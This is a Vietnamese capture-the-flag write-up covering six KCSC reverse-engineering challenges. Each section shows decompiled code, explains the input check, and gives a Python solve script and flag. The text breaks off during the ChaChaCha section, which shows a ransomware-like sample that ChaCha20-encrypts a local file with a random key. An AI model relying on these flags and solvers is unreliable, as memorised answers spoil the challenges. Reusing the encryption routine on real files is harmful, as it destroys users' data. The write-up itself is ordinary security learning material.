# Hidden 
## Misc 
- Đề cho 1 file PE64

![image](https://github.com/user-attachments/assets/2a7ff778-c8c3-44e1-b903-676ccf81ac96)

## Detailed Analysis

- Hàm `main`

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _main();
  printf_0("KCSC{can_you_see_me??}\n");
  return 0;
}
```
- Vì đây là 1 chal warmup nên thoặt qua thấy flag ngay trong `main` như này thì ngỡ rằng đây là flag đúng nhưng thực ra không phải, hàm chuẩn sẽ là hàm `printFlag`

- Hàm `printFlag`
```C
int printFlag()
{
  int result; // eax
  unsigned int v1; // eax
  __int64 v2[3]; // [rsp+20h] [rbp-20h]
  int i; // [rsp+3Ch] [rbp-4h]

  v2[0] = 0xFDE7F1F3CBDBCBC3ui64;
  v2[1] = 0xFBD7FCAFE6E9EBD7ui64;
  result = 0xE5D7EDED;
  v2[2] = 0xF5FEB2EDE5D7EDEDui64;
  for ( i = 0; i <= 0x17; ++i )
  {
    v1 = *((char *)v2 + i);
    LOBYTE(v1) = *((_BYTE *)v2 + i) ^ 0x88;
    result = printf_0("%c", v1);
  }
  return result;
}
```

- Hàm này sẽ có nhiệm vụ xor từng byte của đống data kia với 0x88 và in kết quả ra màn hình, việc viết script sẽ không quá khó khăn
## Script and Flag
```python
def print_flag():
    # Initialize the 64-bit values (little-endian encoding)
    v2 = [
        0xFDE7F1F3CBDBCBC3,
        0xFBD7FCAFE6E9EBD7,
        0xF5FEB2EDE5D7EDED
    ]
    
    # Convert the 64-bit values into a byte array with little-endian order
    byte_array = bytearray()
    for value in v2:
        byte_array.extend(value.to_bytes(8, 'little'))
    
    # XOR each byte with 0x88 and decode to characters
    flag = ''.join(chr(byte ^ 0x88) for byte in byte_array[:24])
    return flag

# Print the flag
flag = print_flag()
print("Flag:", flag)

```
**Flag:** `KCSC{you_can't_see_me:v}`

# easyre
## Misc
- Đề cho 1 file PE64

  ![image](https://github.com/user-attachments/assets/3f407fb9-d11d-45cd-b401-b85cdafb462f)

## Detailed Analysis
- Hàm `main`
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rax
  size_t v4; // rax
  __int64 v5; // rax
  unsigned int v6; // edx
  unsigned int v7; // r8d
  unsigned __int64 v8; // rax
  __m128 v9; // xmm0
  __m128 v10; // xmm1
  __int64 v11; // rcx
  __int64 v12; // rax
  char *v13; // rcx
  char Buffer[16]; // [rsp+20h] [rbp-68h] BYREF
  __int128 v16; // [rsp+30h] [rbp-58h] BYREF
  int v17; // [rsp+40h] [rbp-48h]
  __int128 v18[2]; // [rsp+48h] [rbp-40h] BYREF
  __int64 v19; // [rsp+68h] [rbp-20h]
  int v20; // [rsp+70h] [rbp-18h]
  char v21; // [rsp+74h] [rbp-14h]

  LOBYTE(v17) = 0;
  v19 = 0i64;
  *(_OWORD *)Buffer = 0i64;
  v20 = 0;
  v16 = 0i64;
  v21 = 0;
  memset(v18, 0, sizeof(v18));
  sub_140001010("Enter flag: ");
  v3 = _acrt_iob_func(0);
  fgets(Buffer, 33, v3);
  v4 = strcspn(Buffer, "\n");
  if ( v4 >= 0x21 )
    sub_140001558();
  Buffer[v4] = 0;
  v5 = -1i64;
  do
    ++v5;
  while ( Buffer[v5] );
  if ( v5 == 32 )
  {
    base64((__int64)Buffer, v18);
    v6 = 0;
    v7 = 0;
    v8 = 0i64;
    do
    {
      v9 = (__m128)_mm_loadu_si128((const __m128i *)&byte_140005078[v8]);
      v7 += 32;
      v10 = (__m128)_mm_loadu_si128((const __m128i *)&v18[v8 / 0x10]);
      v8 += 32i64;
      *(__m128 *)&dword_140005058[v8 / 4] = _mm_xor_ps(v10, v9);
      *(__m128 *)&qword_140005068[v8 / 8] = _mm_xor_ps(
                                              (__m128)_mm_loadu_si128((const __m128i *)((char *)&v16 + v8 + 8)),
                                              (__m128)_mm_loadu_si128((const __m128i *)&qword_140005068[v8 / 8]));
    }
    while ( v7 < 0x20 );
    v11 = (int)v7;
    if ( (unsigned __int64)(int)v7 < 0x2C )
    {
      do
      {
        ++v7;
        byte_140005078[v11] ^= *((_BYTE *)v18 + v11);
        ++v11;
      }
      while ( v7 < 0x2C );
    }
    v12 = 0i64;
    while ( byte_1400032F0[v12] == byte_140005078[v12] )
    {
      ++v6;
      ++v12;
      if ( v6 >= 0x2C )
      {
        v13 = "Correct!\n";
        goto LABEL_13;
      }
    }
  }
  v13 = "Incorrect!\n";
LABEL_13:
  sub_140001010(v13);
  return 0;
}
```
- Đầu tiên hàm `main` sẽ kiểm tra độ dài của input có phải là 32 hay không, nếu thỏa mãn thì sẽ tiến hành encode input bằng base64, sau đó sẽ xor input với `byte_7FF6A9F35078`, đoạn xor này sẽ được chia ra làm 2 phần, phần đầu là xor 16 bytes và phần còn lại sẽ xor từng byte một. Cuối cùng input sẽ được kiểm tra với `byte_7FF6A9F332F0` nếu thỏa mãn sẽ in ra string `Correct!` hoặc `Incorrect!` tương ứng

- Với các dữ kiện như trên, ta có thể dễ dàng viết script

## Script and Flag
```python
key =[ 0x92, 0xA1, 0x27, 0xE0, 0x37, 0xCA, 0x70, 0x7E, 0xE6, 0xBE, 
  0x33, 0x1D, 0x5D, 0xFE, 0x29, 0x93, 0xB6, 0x66, 0xF9, 0x02, 
  0x6A, 0x74, 0x0D, 0xDF, 0xD6, 0xEC, 0x5A, 0x71, 0xC8, 0xA3, 
  0xFD, 0x84, 0xC5, 0x13, 0x1E, 0x87, 0xC7, 0x52, 0x50, 0x55, 
  0x01, 0x16, 0xFD, 0xCF]
cypher = [0xC1, 0x91, 0x69, 0xB4, 0x66, 0xF9, 0x04, 0x12, 0xB2, 0xD3, 
  0x7D, 0x6B, 0x0F, 0xB9, 0x7F, 0xF5, 0xD2, 0x1C, 0xBF, 0x32, 
  0x0B, 0x32, 0x34, 0x9C, 0x98, 0xA4, 0x14, 0x37, 0x86, 0xC9, 
  0xAF, 0xE2, 0x9C, 0x46, 0x2B, 0xEC, 0x9F, 0x63, 0x38, 0x23, 
  0x54, 0x78, 0xCD, 0xF2]
for i in range (len(cypher)):
    print(chr(cypher[i]^key[i]),end='') #Remember to decode it back from b64
```
**Flag:** `KCSC{eNcoDe_w1th_B4sE64_aNd_XoR}`

# Spy Room
## Misc
- Đề cho 1 file .NET 32-bit

  ![image](https://github.com/user-attachments/assets/ddace5f7-63fe-4818-991f-bae77ca7d459)

## Detailed Analysis

- Với những file được build bằng .NET, ta sẽ phải phân tích bằng `dnSpy`, các bạn có thể tải tại [đây](https://github.com/dnSpy/dnSpy)

- Hàm `Main`
```C#
// TestEzDotNET.Program
// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
private static void Main()
{
	Console.Write("Enter Something: ");
	char[] array = Console.ReadLine().ToCharArray();
	int num = array.Length;
	char[] array2 = array.Take(num / 4).ToArray<char>();
	char[] array3 = array.Skip(num / 4).Take(num / 4).ToArray<char>();
	char[] array4 = array.Skip(2 * num / 4).Take(num / 4).ToArray<char>();
	char[] array5 = array.Skip(3 * num / 4).ToArray<char>();
	array2 = Program.Xor(array2, array3);
	array3 = Program.Xor(array3, array4);
	array4 = Program.Xor(array4, array5);
	array5 = Program.Xor(array5, array2);
	char[] array6 = array2.Concat(array3).Concat(array4).Concat(array5).ToArray<char>();
	string text = "https://www.youtube.com/watch?v=L8XbI9aJOXk";
	array6 = Program.Xor(array6, text.ToCharArray());
	byte[] source = new byte[]
	{
		85,
		122,
		105,
		71,
		17,
		94,
		71,
		24,
		114,
		78,
		107,
		11,
		108,
		106,
		107,
		113,
		121,
		51,
		91,
		117,
		86,
		110,
		100,
		18,
		124,
		104,
		71,
		66,
		123,
		3,
		111,
		99,
		74,
		107,
		69,
		77,
		111,
		2,
		120,
		125,
		83,
		99,
		62,
		99,
		109,
		76,
		119,
		111,
		59,
		32,
		1,
		93,
		69,
		117,
		84,
		106,
		73,
		85,
		112,
		66,
		114,
		92,
		61,
		80,
		80,
		104,
		111,
		72,
		98,
		28,
		88,
		94,
		27,
		120,
		15,
		76,
		15,
		67,
		86,
		117,
		81,
		108,
		18,
		37,
		34,
		101,
		104,
		109,
		23,
		30,
		62,
		78,
		88,
		10,
		2,
		63,
		43,
		72,
		102,
		38,
		76,
		23,
		34,
		62,
		21,
		97,
		1,
		97
	};
	if (!array6.SequenceEqual((from e in source
	select (char)e).ToArray<char>()))
	{
		Console.WriteLine("Wrong!!");
		return;
	}
	Console.WriteLine("Decode It!!");
}
```

- Chương trình thực hiện chia input của chúng ta ra làm 4 phần, tiếp đến sẽ sử dụng một hàm `Xor` custom để xor từng block này với nhau theo dạng `block1^block2`, `block2^block3`,... Cuối cùng thì sẽ gộp lại các block trên lại với nhau và xor với string `https://www.youtube.com/watch?v=L8XbI9aJOXk` và kiểm tra với `source`

- Hàm `Xor`
```C#
private static char[] Xor(char[] a, char[] b)
{
	int num = Math.Max(a.Length, b.Length);
	char[] array = new char[num];
	for (int i = 0; i < num; i++)
	{
		if (a.Length >= b.Length)
		{
			array[i] = (a[i] ^ b[i % b.Length]);
		}
		else
		{
			array[i] = (a[i % a.Length] ^ b[i]);
		}
	}
	return array;
}
```
- Hàm này chỉ là kiểm tra xem độ dài của 2 array để xor. Nếu độ dài arr1 lớn hơn arr2 thì khi arr1 xor hết các phần tử của arr2 thì lúc này phần tử tiếp đến của arr1 sẽ được xor lại từ phần tử đầu tiên của arr2
- Vậy để giải ta chỉ cần đảo ngược lại quá trình trên, output sau khi tìm được sẽ là 1 string b64 được encode 3 lần nên ta cần phải chú ý
## Script and Flag
```python
import base64 as b64


def xor(a, b):
    #Performs XOR operation on two character arrays.
    max_len = max(len(a), len(b))
    result = []
    for i in range(max_len):
        if len(a) >= len(b):
            result.append(chr(ord(a[i]) ^ ord(b[i % len(b)])))
        else:
            result.append(chr(ord(a[i % len(a)]) ^ ord(b[i])))
    return ''.join(result)

def solve():
    # Source byte array
    source = [
        85, 122, 105, 71, 17, 94, 71, 24, 114, 78, 107, 11, 108, 106, 107, 113,
        121, 51, 91, 117, 86, 110, 100, 18, 124, 104, 71, 66, 123, 3, 111, 99,
        74, 107, 69, 77, 111, 2, 120, 125, 83, 99, 62, 99, 109, 76, 119, 111,
        59, 32, 1, 93, 69, 117, 84, 106, 73, 85, 112, 66, 114, 92, 61, 80,
        80, 104, 111, 72, 98, 28, 88, 94, 27, 120, 15, 76, 15, 67, 86, 117,
        81, 108, 18, 37, 34, 101, 104, 109, 23, 30, 62, 78, 88, 10, 2, 63,
        43, 72, 102, 38, 76, 23, 34, 62, 21, 97, 1, 97
    ]
    source_chars = ''.join(chr(e) for e in source)

    # The URL used in the XOR process
    text = "https://www.youtube.com/watch?v=L8XbI9aJOXk"

    # Reverse XOR with the URL text
    temp_array = xor(source_chars, text)

    # Calculate the length of the original input
    n = len(temp_array)

    # Split the reversed XOR result back into parts
    num = n // 4
    array2 = temp_array[:num]
    array3 = temp_array[num:2*num]
    array4 = temp_array[2*num:3*num]
    array5 = temp_array[3*num:]

    # Reverse the sequence of XOR operations
    array5 = xor(array5, array2)
    array4 = xor(array4, array5)
    array3 = xor(array3, array4)
    array2 = xor(array2, array3)

    # Combine the parts to reconstruct the original input
    original_input = array2 + array3 + array4 + array5

    return original_input

if __name__ == "__main__":
    result = solve()
    for _ in range(3):
        result = b64.b64decode(result)
    print(result)
```
**Flag:** `KCSC{Easy_Encryption_With_DotNET_Program:3}`
# EzRev
## Mics
- Đề cho 1 file PE64

![image](https://github.com/user-attachments/assets/c5d6c30a-1b51-47b3-8f27-6c0d5412f2cc)

## Detailed Analysis
- Hàm `main`

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+20h] [rbp-28h]
  __int64 v5; // [rsp+28h] [rbp-20h]

  sub_140001200("Enter Something: ", argv, envp);
  sub_1400012D0("%s", byte_1400047A8);
  if ( (unsigned int)sub_140001100(byte_1400047A8) == 0x89D5B562 )
  {
    v5 = -1i64;
    do
      ++v5;
    while ( byte_1400047A8[v5] );
    if ( v5 == 40 )
    {
      sub_140001000((__int64)byte_1400047A8);
      dword_1400047A0 = 1;
      for ( i = 0; i < 40; ++i )
      {
        if ( dword_140004080[i] != dword_140004700[i] )
          dword_1400047A0 = 0;
      }
    }
  }
  if ( dword_1400047A0 )
    sub_140001200("Excellent!! Here is your flag: KCSC{%s}", byte_1400047A8);
  else
    sub_140001200("You're chicken!!!");
  return 0;
}
```
- Đầu tiên chương trình sẽ kiểm tra hash `FNV-1a` bằng hàm `sub_140001100` của input, nếu hash thỏa mãn thì input sẽ tiếp tục được biến đổi tại `sub_140001000`, cuối cùng kiểm tra input sau khi được biến đổi với `dword_140004080`, thỏa mãn thì in ra flag và ngược lại in ra string `You're chicken!!!`

- Hàm `sub_140001000`

```C
__int64 __fastcall sub_140001000(__int64 a1)
{
  __int64 result; // rax
  unsigned int v2; // [rsp+0h] [rbp-38h]
  unsigned int i; // [rsp+4h] [rbp-34h]
  int j; // [rsp+8h] [rbp-30h]
  int v5; // [rsp+Ch] [rbp-2Ch]
  int v6; // [rsp+10h] [rbp-28h]
  __int64 v7; // [rsp+18h] [rbp-20h]

  v7 = -1i64;
  do
    ++v7;
  while ( *(_BYTE *)(a1 + v7) );
  for ( i = 0; ; ++i )
  {
    result = (unsigned int)v7;
    if ( i >= (unsigned int)v7 )
      break;
    v5 = 4;
    v6 = 6;
    v2 = *(unsigned __int8 *)(a1 + (int)i);
    for ( j = 0; j < 5; ++j )
    {
      v2 ^= __ROL4__(v2, v5) ^ __ROR4__(v2, v6);
      v5 *= 2;
      v6 *= 2;
    }
    dword_140004700[i] = v2;
  }
  return result;
}
```
- Hàm này biến đổi input của chúng ta bằng các phép rol4, ror4 và Xor. Có điều phải chú ý rằng các phép rol và ror thực hiện trên trường số 32 bit. Bởi hàm này chỉ xử lí từng kí tự 1 của input nên để giải ta có thể build lại hàm này và viết script bằng cách bruteforce

## Script and Flag
```python
def rol(val, bits, bit_size):
    return (val << bits % bit_size) & (2 ** bit_size - 1) | \
           ((val & (2 ** bit_size - 1)) >> (bit_size - (bits % bit_size)))
def ror(val, bits, bit_size):
    return ((val & (2 ** bit_size - 1)) >> bits % bit_size) | \
           (val << (bit_size - (bits % bit_size)) & (2 ** bit_size - 1))
dest = [0xF30C0330, 0x340DDE9D, 0x750D9AC9, 0x391FBC2A, 0x9F16AF5B, 0xE6180661, 0x6C1AAC6B, 0x340DDE9D, 0xB60D5635, 0x9F16AF5B,
0xA3195364, 0x681BBD3A, 0xF30C0330, 0xA3195364, 0xAB1B71C6, 0xF30C0330, 0xF21D5274, 0x9F16AF5B, 0xE6180661, 0x300CCFCC,
0xF21D5274, 0x9F16AF5B, 0xAB1B71C6, 0xA3195364, 0x750D9AC9, 0xA3195364, 0x9F16AF5B, 0xF21D5274, 0xF30C0330, 0xA3195364,
0xF21D5274, 0x351C8FD9, 0x710C8B98, 0xF70D1261, 0x2D1AE83F, 0xF30C0330, 0xEE1A24C3, 0xF70D1261, 0x6108CEDC, 0x6108CEDC,]
count = 0
while(count<len(dest)-1):
    for j in range(0x20,0x7f):
        v5 = 4
        v6 = 6
        v2 = j
        for i in range(5):

            v2 ^= rol(v2, v5,32) ^ ror(v2, v6,32)
            v5 *= 2
            v6 *= 2
        if(v2 == dest[count]):
            print(chr(j),end='')
            count +=1
```
**Flag:** `KCSC{345y_fl46_ch3ck3r_f0r_kc5c_r3cru17m3n7!}`
# Waiterfall
## Mics
- Đề cho 1 file PE64 🐧

![image](https://github.com/user-attachments/assets/83547248-353a-4e82-bcd0-6c807390472c)

## Detailed Analysis
- Hàm `main` (đừng nhìn vào cái graph của nó 💀)
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int8 v3; // di
  unsigned int v4; // esi
  __int64 v5; // r14
  __int64 v6; // rbp
  __int64 v7; // r15
  __int64 v8; // r12
  __int64 v9; // r13
  char v10; // al
  __int64 v11; // rdx
  char *v12; // rcx
  __int64 v14; // rcx
  __int64 v15; // rcx
  __int64 v16; // rcx
  __int64 v17; // rcx
  __int64 v18; // rcx
  __int64 v19; // rcx
  __int64 v20; // rcx
  char v21[80]; // [rsp+20h] [rbp-88h]

  v3 = 0;
  sub_140001020("Show your skill :))\n");
  v4 = 0;
  v5 = 0x1000008020020i64;
  v6 = 0i64;
  v7 = 0x60010020000100i64;
  v8 = 0x100020080408000i64;
  v9 = 0x844000044000i64;
  do
  {
    sub_140001080("%c");
    v10 = v21[v6];
    if ( (unsigned __int8)v10 < 0x43u )
    {
LABEL_190:
      Sleep(0); // I patched this so no need to wait for like eternity
      goto LABEL_191;
    }
    switch ( v10 )
    {
      case 'C':
        v3 += ((v4 - 1) & 0xFFFFFFFD) == 0;
        break;
      case 'D':
      case 'E':
      case 'F':
      case 'G':
      case 'H':
      case 'I':
      case 'J':
        goto LABEL_190;
      case 'K':
        v3 += v4 == 0;
        break;
      case 'L':
      case 'M':
      case 'N':
      case 'O':
      case 'P':
      case 'Q':
      case 'R':
        goto LABEL_190;
      case 'S':
        v3 += v4 == 2;
        break;
      case 'T':
      case 'U':
      case 'V':
      case 'W':
      case 'X':
      case 'Y':
      case 'Z':
      case '[':
      case '\\':
      case ']':
      case '^':
        goto LABEL_190;
      case '_':
        if ( v4 <= 0x31 )
        {
          v20 = 0x2101004011000i64;
          if ( _bittest64(&v20, v4) )
            ++v3;
        }
        break;
      case '`':
        goto LABEL_190;
      case 'a':
        if ( v4 <= 0x34 )
        {
          v19 = 0x10000210000040i64;
          if ( _bittest64(&v19, v4) )
            ++v3;
        }
        break;
      case 'b':
        goto LABEL_190;
      case 'c':
        v3 += v4 == 37;
        break;
      case 'd':
        v3 += v4 == 20;
        break;
      case 'e':
        if ( v4 <= 0x37 )
        {
          v18 = 0x80000040200000i64;
          if ( _bittest64(&v18, v4) )
            ++v3;
        }
        break;
      case 'f':
        if ( v4 <= 0x32 )
        {
          v17 = 0x4200100802000i64;
          if ( _bittest64(&v17, v4) )
            ++v3;
        }
        break;
      case 'g':
        if ( v4 == 11 || v4 == 60 )
          ++v3;
        break;
      case 'h':
        goto LABEL_190;
      case 'i':
        if ( v4 <= 0x3A )
        {
          v16 = 0x400000000000280i64;
          if ( _bittest64(&v16, v4) )
            ++v3;
        }
        break;
      case 'j':
      case 'k':
        goto LABEL_190;
      case 'l':
        if ( v4 <= 0x33 )
        {
          v15 = 0x8480C02000000i64;
          if ( _bittest64(&v15, v4) )
            ++v3;
        }
        break;
      case 'm':
        goto LABEL_190;
      case 'n':
        if ( v4 <= 0x3B )
        {
          v14 = 0xA00008000080400i64;
          if ( _bittest64(&v14, v4) )
            ++v3;
        }
        break;
      case 'o':
        if ( v4 <= 0x2F && _bittest64(&v9, v4) )
          ++v3;
        break;
      case 'p':
      case 'q':
        goto LABEL_190;
      case 'r':
        if ( v4 <= 0x38 && _bittest64(&v8, v4) )
          ++v3;
        break;
      case 's':
        goto LABEL_190;
      case 't':
        if ( v4 <= 0x36 && _bittest64(&v7, v4) )
          ++v3;
        break;
      case 'u':
        v3 += v4 == 24;
        break;
      case 'v':
        goto LABEL_190;
      case 'w':
        if ( v4 <= 0x30 && _bittest64(&v5, v4) )
          ++v3;
        break;
      case 'x':
      case 'y':
      case 'z':
        goto LABEL_190;
      case '{':
        v3 += v4 == 4;
        break;
      case '|':
        goto LABEL_190;
      case '}':
        v3 += v4 == 61;
        break;
      default:
        if ( v10 > 125
          || v10 == (char)0x80
          || v10 == -127
          || v10 == -126
          || v10 == -125
          || v10 == -124
          || v10 == -123
          || v10 == -122
          || v10 == -121
          || v10 == -120
          || v10 == -119
          || v10 == -118
          || v10 == -117
          || v10 == -116
          || v10 == -115
          || v10 == -114
          || v10 == -113
          || v10 == -112
          || v10 == -111
          || v10 == -110
          || v10 == -109
          || v10 == -108
          || v10 == -107
          || v10 == -106
          || v10 == -105
          || v10 == -104
          || v10 == -103
          || v10 == -102
          || v10 == -101
          || v10 == -100
          || v10 == -99
          || v10 == -98
          || v10 == -97
          || v10 == -96
          || v10 == -95
          || v10 == -94
          || v10 == -93
          || v10 == -92
          || v10 == -91
          || v10 == -90
          || v10 == -89
          || v10 == -88
          || v10 == -87
          || v10 == -86
          || v10 == -85
          || v10 == -84
          || v10 == -83
          || v10 == -82
          || v10 == -81
          || v10 == -80
          || v10 == -79
          || v10 == -78
          || v10 == -77
          || v10 == -76
          || v10 == -75
          || v10 == -74
          || v10 == -73
          || v10 == -72
          || v10 == -71
          || v10 == -70
          || v10 == -69
          || v10 == -68
          || v10 == -67
          || v10 == -66
          || v10 == -65
          || v10 == -64
          || v10 == -63
          || v10 == -62
          || v10 == -61
          || v10 == -60
          || v10 == -59
          || v10 == -58
          || v10 == -57
          || v10 == -56
          || v10 == -55
          || v10 == -54
          || v10 == -53
          || v10 == -52
          || v10 == -51
          || v10 == -50
          || v10 == -49
          || v10 == -48
          || v10 == -47
          || v10 == -46
          || v10 == -45
          || v10 == -44
          || v10 == -43
          || v10 == -42
          || v10 == -41
          || v10 == -40
          || v10 == -39
          || v10 == -38
          || v10 == -37
          || v10 == -36
          || v10 == -35
          || v10 == -34
          || v10 == -33
          || v10 == -32
          || v10 == -31
          || v10 == -30
          || v10 == -29
          || v10 == -28
          || v10 == -27
          || v10 == -26
          || v10 == -25
          || v10 == -24
          || v10 == -23
          || v10 == -22
          || v10 == -21
          || v10 == -20
          || v10 == -19
          || v10 == -18
          || v10 == -17
          || v10 == -16
          || v10 == -15
          || v10 == -14
          || v10 == -13
          || v10 == -12
          || v10 == -11
          || v10 == -10
          || v10 == -9
          || v10 == -8
          || v10 == -7
          || v10 == -6
          || v10 == -5
          || v10 == -4
          || v10 == -3
          || v10 == -2 )
        {
          goto LABEL_190;
        }
        break;
    }
LABEL_191:
    ++v4;
    ++v6;
  }
  while ( (int)v4 < 62 );
  v11 = -1i64;
  do
    ++v11;
  while ( v21[v11] );
  v12 = "Correct\n";
  if ( v3 != v11 )
    v12 = ":((";
  sub_140001020(v12);
  return 0;
}
```
- Chương trình này đã bị obfuscated bằng kĩ thuật `Control Flow Flattening`, nói ngắn gọn thi kĩ thuật này sẽ đưa hết tất cả các chức năng của chương trình vào trong 1 state và thực thi các state này thông qua 1 switch case (về cơ bản thì khá giống VM), nếu các bạn muốn tìm hiểu thêm thì có thể tham khảo tại (đây)[https://zerotistic.blog/posts/cff-remover/]
- Về hướng giải quyết thì ta có 2 cách, 1 sẽ là viết một disassembler (symbolic executioner) cho nó hoặc ta có thể ngồi debug
- Cơ bản thì chương trình sẽ gán cho 1 số kí tự các giá trị cụ thể và index của một vài kí tự nhất định. Sau đó thì dựa vào các bit tại index cụ thể của giá trị này để kiểm tra đúng sai. Bên dưới là script giải của mình

## Script and Flag
```python
def is_bit_set(value, index):
    """Check if the bit at 'index' is set in 'value'."""
    return (value & (1 << index)) != 0

def find_valid_input():

    patterns = {
        '_': 0x2101004011000,
        'a': 0x10000210000040,
        'e': 0x80000040200000,
        'f': 0x4200100802000,
        'i': 0x400000000000280,
        'l': 0x8480C02000000,
        'n': 0xA00008000080400,
        'o': 0x844000044000,
        'r': 0x100020080408000,
        't': 0x60010020000100,
        'w': 0x1000008020020,
    }


    special_cases = {
        'C': lambda v4: ((v4 - 1) & 0xFFFFFFFD) == 0,
        'K': lambda v4: v4 == 0,
        'S': lambda v4: v4 == 2,
        'c': lambda v4: v4 == 0x25,
        'd': lambda v4: v4 == 0x14,
        'g': lambda v4: v4 in [0xB, 0x3C],
        'u': lambda v4: v4 == 0x18,
        '{': lambda v4: v4 == 4,
        '}': lambda v4: v4 == 0x3D,
    }


    length = 62
    result = ['?'] * length


    for v4 in range(length):
        for char, condition in special_cases.items():
            if condition(v4):
                result[v4] = char
                break
        else:
            for char, pattern in patterns.items():
                if v4 <= 0x3F and is_bit_set(pattern, v4):
                    result[v4] = char
                    break

    return ''.join(result)


valid_input = find_valid_input()
print(valid_input)

```
**Flag:** `KCSC{waiting_for_wonderful_waterfall_control_flow_flatterning}`

# ChaChaCha
## Mics
- Đề cho 1 file PE32, DMP và important_note.txt

![image](https://github.com/user-attachments/assets/69f8d999-655a-49b9-a591-ca431f0f98b0)

## Detailed Analysis
- Hàm `main`

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  HMODULE LibraryA; // eax
  BOOLEAN (__stdcall *SystemFunction036)(PVOID, ULONG); // eax
  HMODULE v5; // eax
  BOOLEAN (__stdcall *ProcAddress)(PVOID, ULONG); // eax
  HANDLE FileW; // eax
  void *v8; // ebx
  signed int FileSize; // edi
  _BYTE *v11; // ebx
  int v12; // ecx
  _BYTE *v13; // ecx
  signed int v14; // esi
  signed int v15; // ebx
  _BYTE *v16; // eax
  char v17; // al
  char v18; // [esp+0h] [ebp-D8h]
  HANDLE hFile; // [esp+Ch] [ebp-CCh]
  signed int v20; // [esp+10h] [ebp-C8h]
  char *v21; // [esp+14h] [ebp-C4h]
  _BYTE *v22; // [esp+18h] [ebp-C0h]
  char *v23; // [esp+1Ch] [ebp-BCh]
  DWORD NumberOfBytesWritten; // [esp+20h] [ebp-B8h] BYREF
  DWORD NumberOfBytesRead; // [esp+24h] [ebp-B4h] BYREF
  char v26[48]; // [esp+28h] [ebp-B0h] BYREF
  int v27; // [esp+58h] [ebp-80h]
  char v28[64]; // [esp+68h] [ebp-70h] BYREF
  char v29[32]; // [esp+A8h] [ebp-30h] BYREF
  unsigned __int8 v30[12]; // [esp+C8h] [ebp-10h] BYREF

  LibraryA = LoadLibraryA("advapi32.dll");
  SystemFunction036 = (BOOLEAN (__stdcall *)(PVOID, ULONG))GetProcAddress(LibraryA, "SystemFunction036");
  SystemFunction036(v29, 32);
  v5 = LoadLibraryA("advapi32.dll");
  ProcAddress = (BOOLEAN (__stdcall *)(PVOID, ULONG))GetProcAddress(v5, "SystemFunction036");
  ProcAddress(v30, 12);
  FileW = CreateFileW(FileName, 0xC0000000, 0, 0, 3u, 0x80u, 0);
  v8 = FileW;
  hFile = FileW;
  if ( FileW == (HANDLE)-1 )
  {
    sub_401590("Cannot Open File", v18);
    CloseHandle((HANDLE)0xFFFFFFFF);
    return 1;
  }
  else
  {
    FileSize = GetFileSize(FileW, 0);
    v20 = FileSize;
    v21 = (char *)malloc(FileSize);
    if ( ReadFile(v8, v21, FileSize, &NumberOfBytesRead, 0) )
    {
      v11 = malloc(FileSize);
      v22 = v11;
      sub_4013D0(v26, (unsigned __int8 *)v29, v12, v30);
      v14 = 0;
      if ( FileSize > 0 )
      {
        v23 = v28;
        do
        {
          sub_401000(v26, v28, v13);
          ++v27;
          v15 = v14 + 64;
          if ( !__OFSUB__(v14, v14 + 64) )
          {
            v16 = v22;
            do
            {
              if ( v14 >= FileSize )
                break;
              v13 = &v16[v14];
              v17 = v23[v14] ^ v16[v14 + v21 - v22];
              ++v14;
              FileSize = v20;
              *v13 = v17;
              v16 = v22;
            }
            while ( v14 < v15 );
          }
          v23 -= 64;
          v14 = v15;
        }
        while ( v15 < FileSize );
        v11 = v22;
      }
      SetFilePointer(hFile, 0, 0, 0);
      if ( WriteFile(hFile, v11, FileSize, &NumberOfBytesWritten, 0) )
      {
        CloseHandle(hFile);
        sub_401590("Some important file has been encrypted!!!\n", (char)FileName);
        return 0;
      }
      else
      {
        sub_401590("Cannot Write File", v18);
        CloseHandle(hFile);
        return 1;
      }
    }
    else
    {
      sub_401590("Cannot Read File", v18);
      CloseHandle(v8);
      return 1;
    }
  }
}
```
- Hàm này sẽ thực hiện gọi `SystemFunction036` để gen ra số ngẫu nghiên (Hàm này thực chât là ``RtlGenRandom``) làm key và nonce cho quá trình mã hóa, tiếp đến là mở file `important_note.txt` và tiến hành mã hóa file này (với tên bài như vậy thì ta cũng có thể phần nào đoán được thuật toán mã hóa là ChaCha20). Sau khi mã hóa xong thì chương trình sẽ in ra `Some important file has been encrypted!!!`
- Về việc tại sao có thể xác định được hàm `SystemFunction036` là `RtlGenRandom` thì theo như [MSDN](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-rtlgenrandom) thì hàm này không có import library của riêng nó và tên của nó trong resource là `SystemFunction036`
- Tiếp theo, để kiểm chứng thuật toán mã hóa là gì, ta sẽ phân tích hàm `sub_4013D0`
```C
int __fastcall sub_4013D0(_DWORD *a1, unsigned __int8 *a2, int a3, unsigned __int8 *a4)
{
  int v5; // esi
  int v6; // ecx
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  int v11; // eax
  int v12; // ecx
  int v13; // eax
  int v14; // ecx
  int v15; // eax
  int v16; // ecx
  int v17; // eax
  int v18; // ecx
  int v19; // eax
  int v21; // ecx
  int v22; // eax
  int v23; // ecx
  int v24; // eax
  int v25; // ecx
  int result; // eax

  v5 = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);
  v6 = *((unsigned __int16 *)a2 + 3);
  qmemcpy(a1, "expand 32-byte k", 16);
  v7 = a2[10];
  a1[5] = a2[4] | ((a2[5] | (v6 << 8)) << 8);
  v8 = v7 | (a2[11] << 8);
  a1[4] = v5;
  v9 = a2[14];
  a1[6] = a2[8] | ((a2[9] | (v8 << 8)) << 8);
  v10 = a2[12] | ((a2[13] | ((v9 | (a2[15] << 8)) << 8)) << 8);
  v11 = a2[18];
  a1[7] = v10;
  v12 = a2[16] | ((a2[17] | ((v11 | (a2[19] << 8)) << 8)) << 8);
  v13 = a2[22];
  a1[8] = v12;
  v14 = a2[20] | ((a2[21] | ((v13 | (a2[23] << 8)) << 8)) << 8);
  v15 = a2[26];
  a1[9] = v14;
  v16 = a2[24] | ((a2[25] | ((v15 | (a2[27] << 8)) << 8)) << 8);
  v17 = a2[30];
  a1[10] = v16;
  v18 = a2[29] | ((v17 | (a2[31] << 8)) << 8);
